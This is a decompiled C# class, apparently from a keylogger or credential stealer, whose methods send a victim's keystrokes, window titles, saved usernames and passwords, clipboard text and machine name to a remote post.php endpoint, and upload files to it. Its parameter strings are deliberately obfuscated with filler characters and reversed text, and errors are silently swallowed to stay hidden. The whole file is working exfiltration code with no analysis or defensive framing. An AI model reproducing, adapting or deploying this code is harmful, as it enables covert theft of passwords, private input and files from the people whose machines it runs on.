using System;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000009 RID: 9
internal class Send
{
	// Token: 0x06000032 RID: 50 RVA: 0x00002ADC File Offset: 0x00001ADC
	public static void SendLog(string Link, string LogType, string WindowTitle, string KeystrokesTyped, string Application, string Host, string Username, string Password, string ClipboardText)
	{
		try
		{
			WebClient webClient = new WebClient();
			if (Operators.CompareString(LogType, "Keystrokes", false) == 0)
			{
				webClient.DownloadString(string.Concat(new string[]
				{
					Link,
					"$pos$t$.$ph$p$?$ty$p$e$=$k$eys$tro$ke$s$&$mac$hi$ne$na$me$=$".Replace("$", ""),
					Send.Get_Comp(),
					"&windowtitle=",
					WindowTitle,
					"&keystrokestyped=",
					KeystrokesTyped,
					Strings.StrReverse("=emitenihcam&"),
					DateAndTime.Now.ToShortTimeString()
				}));
			}
			else if (Operators.CompareString(LogType, Strings.StrReverse("sdrowssaP"), false) == 0)
			{
				webClient.DownloadString(string.Concat(new string[]
				{
					Link,
					"#po#st.#ph#p?#typ#e=p#assw#ords#&mach#inen#ame=#".Replace("#", ""),
					Send.Get_Comp(),
					"&application=",
					Application,
					"&link=",
					Host,
					"&username=",
					Username,
					Strings.StrReverse("=drowssap&"),
					Password
				}));
			}
			else if (Operators.CompareString(LogType, Strings.StrReverse("draobpilC"), false) == 0)
			{
				webClient.DownloadString(string.Concat(new string[]
				{
					Link,
					"$po$st$.$ph$p$?$ty$pe$=$cl$ip$boa$rd&$mac$hine$nam$e=$".Replace("$", ""),
					Send.Get_Comp(),
					"&windowtitle=",
					WindowTitle,
					"&clipboardtext=",
					ClipboardText,
					Strings.StrReverse("=emitenihcam&"),
					DateAndTime.Now.ToShortTimeString()
				}));
			}
			else if (Operators.CompareString(LogType, "Screenshot", false) != 0)
			{
				if (Operators.CompareString(LogType, "Notification", false) == 0)
				{
					webClient.DownloadString(string.Concat(new string[]
					{
						Link,
						"$pos$t.$p$hp$?$typ$e=$not$ific$a$tion$&$mac$h$in$e$n$a$m$e$=$".Replace("$", ""),
						Send.Get_Comp(),
						Strings.StrReverse("=emitenihcam&"),
						DateAndTime.Now.ToShortTimeString()
					}));
				}
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000033 RID: 51 RVA: 0x00002D20 File Offset: 0x00001D20
	public static string Get_Comp()
	{
		return Environment.MachineName;
	}

	// Token: 0x06000034 RID: 52 RVA: 0x00002D38 File Offset: 0x00001D38
	public static void UploadFile(string Link, string Path)
	{
		try
		{
			WebClient webClient = new WebClient();
			byte[] bytes = webClient.UploadFile(Link, Path);
			string @string = Encoding.UTF8.GetString(bytes);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000035 RID: 53 RVA: 0x00002D80 File Offset: 0x00001D80
	public static string Program_data(string a)
	{
		return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), a);
	}

	// Token: 0x06000036 RID: 54 RVA: 0x00002DA0 File Offset: 0x00001DA0
	public static string Clip_Text()
	{
		return Clipboard.GetText();
	}
}
